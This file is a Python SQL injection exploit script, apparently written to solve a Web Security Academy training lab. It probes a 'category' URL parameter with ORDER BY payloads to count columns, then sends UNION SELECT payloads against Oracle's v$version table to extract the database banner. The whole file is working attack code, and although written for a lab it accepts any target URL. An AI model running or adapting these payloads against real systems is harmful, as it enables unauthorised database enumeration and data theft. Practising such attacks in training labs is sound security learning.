import requests
import sys
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry



def determine_columns(lab_url):
    try:
        session = requests.Session()
        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
        num_of_columns = 0
        for i in range(1, 20):
            response = session.get(f"{lab_url}/filter?category=x' ORDER BY {i}--", timeout=10)
            if response.status_code == 500:
                num_of_columns = i - 1
                break
        return num_of_columns

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print(f"Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.RequestException as e:
        print(f"(-) An error has occurred: {e}")
        sys.exit(1)


def extract_text(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    version_string = soup.find('tbody').get_text().strip()

    #Removing the extra space between lines
    formatted_version_string = ""
    for line in version_string.split("\n\n"):
        formatted_version_string += "\n" + line.strip()

    return formatted_version_string


def get_db_version(lab_url, num_of_columns):
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
    for i in range(num_of_columns):
        payload = ["NULL"] * num_of_columns
        payload[i] = "banner"
        payload = ",".join(payload)
        url = f"{lab_url}/filter?category=x' UNION SELECT {payload} FROM v$version--"
        response = session.get(url)
        if response.status_code == 200:
            return extract_text(response)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <url>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    lab_url = sys.argv[1].rstrip('/')
    num_of_columns = determine_columns(lab_url)
    print(f"(+) Database Version Information: {get_db_version(lab_url, num_of_columns)}")


if __name__ == "__main__":
    main()
